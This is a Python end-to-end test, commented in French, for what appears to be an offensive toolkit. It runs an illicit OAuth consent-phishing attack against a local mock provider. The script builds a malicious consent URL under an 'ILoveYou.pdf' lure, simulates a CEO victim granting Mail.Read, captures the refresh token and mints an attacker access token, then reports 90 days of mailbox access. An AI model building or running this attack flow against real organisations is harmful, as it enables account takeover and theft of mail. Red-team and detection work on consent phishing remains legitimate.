"""
test_oauth_consent.py - Test end-to-end du Illicit OAuth Consent
================================================================
1. Démarre le mock OAuth provider sur :9000
2. Génère l'URL d'attaque
3. Simule la victime qui accepte le consentement
4. Vérifie que le refresh_token est capturé
5. Tente de l'utiliser pour un nouveau access_token (simule l'attaquant)
6. Arrêt propre

Usage : source .venv/bin/activate && python test_oauth_consent.py
"""

import sys
import threading
import time
import urllib.parse

import httpx

from attack.oauth_consent import (
    MaliciousApp,
    generate_attack_url,
    get_default_app,
    list_apps,
    list_tokens,
    mint_token_from_code,
    store_token,
)
from attack.oauth_consent.mock_provider import run as run_provider


def main() -> int:
    print("=" * 70)
    print(" VANTABLACK - Test Illicit OAuth Consent (ILoveYou.pdf)")
    print("=" * 70)

    # 1) Démarrage du mock provider en arrière-plan
    provider_thread = threading.Thread(
        target=run_provider, kwargs={"host": "127.0.0.1", "port": 9000},
        daemon=True,
    )
    provider_thread.start()
    time.sleep(2.5)
    print("[1/6] Mock OAuth provider démarré sur :9000")

    # 2) Vérification de la disponibilité
    try:
        r = httpx.get("http://127.0.0.1:9000/admin/tokens", timeout=3)
        print(f"[2/6] GET /admin/tokens (initial) -> {r.status_code}, count={r.json()['count']}")
    except Exception as e:
        print(f"[2/6] ERREUR provider non accessible : {e}")
        return 1

    # 3) Génération de l'URL d'attaque
    app = get_default_app()
    print(f"[3/6] App malveillante : {app.name} (client_id={app.client_id[:8]}...)")
    print(f"       Scopes demandés : {app.scope_string}")
    attack_url = generate_attack_url(app=app, provider="mock")
    print(f"       URL d'attaque    : {attack_url[:120]}...")

    # 4) Simulation de la victime : GET sur l'URL (affiche l'écran de consentement)
    r = httpx.get(attack_url, timeout=5, follow_redirects=False)
    print(f"[4/6] GET /oauth/authorize (victim) -> {r.status_code}, "
          f"contient '{app.name}' ? {app.name in r.text}, "
          f"contient 'Mail.Read' ? {'Mail.Read' in r.text}")

    # 5) La victime accepte : on extrait le session_id du HTML et on POST
    # On parse le HTML pour trouver le session_id
    import re
    m = re.search(r'name="session_id"\s+value="([^"]+)"', r.text)
    if not m:
        print("[5/6] ERREUR : session_id non trouvé dans le HTML")
        return 1
    session_id = m.group(1)

    r = httpx.post(
        "http://127.0.0.1:9000/oauth/authorize",
        data={"session_id": session_id, "user": "ceo@entreprise.local"},
        timeout=5, follow_redirects=False,
    )
    print(f"[5/6] POST /oauth/authorize (accept) -> {r.status_code}, "
          f"Location header présent ? {'Location' in r.headers}")
    if r.status_code != 302:
        print(f"       Headers : {dict(r.headers)}")
        print(f"       Body : {r.text[:300]}")
        return 1
    callback_url = r.headers["Location"]
    print(f"       Callback URL : {callback_url[:120]}...")

    # 6) L'attaquant suit le callback (reçoit le code)
    r = httpx.get(callback_url, timeout=5)
    print(f"[6/6] GET /auth/callback (attacker) -> {r.status_code}, "
          f"contient 'Connexion réussie' ? {'Connexion réussie' in r.text}")

    # 7) Vérification des tokens capturés
    r = httpx.get("http://127.0.0.1:9000/admin/tokens", timeout=3)
    data = r.json()
    print(f"\n[+] Tokens capturés : {data['count']}")
    for t in data["tokens"]:
        print(f"    - user={t['user']}, app={t['app']}, scope={t['scope'][:60]}")
        print(f"      refresh_eta={t['refresh_eta_days']}j")

    if data["count"] == 0:
        print("\n❌ TEST ÉCHOUÉ — Aucun token capturé")
        return 1

    # 8) Attaquant utilise le refresh_token pour obtenir un access_token
    r = httpx.post(
        "http://127.0.0.1:9000/oauth/token",
        data={"grant_type": "authorization_code", "code": "test_again",
              "client_id": app.client_id, "redirect_uri": app.redirect_uri},
        timeout=5,
    )
    print(f"\n[*] Attaquant : POST /oauth/token (refresh) -> {r.status_code}")
    token_data = r.json()
    print(f"    access_token  = {token_data['access_token'][:30]}...")
    print(f"    refresh_token = {token_data['refresh_token'][:30]}...")
    print(f"    expires_in    = {token_data['expires_in']}s")

    print("=" * 70)
    print(" TEST OAuth Consent RÉUSSI ✅")
    print(" Refresh token capturé — l'attaquant a un accès mailbox pendant 90j")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    sys.exit(main())
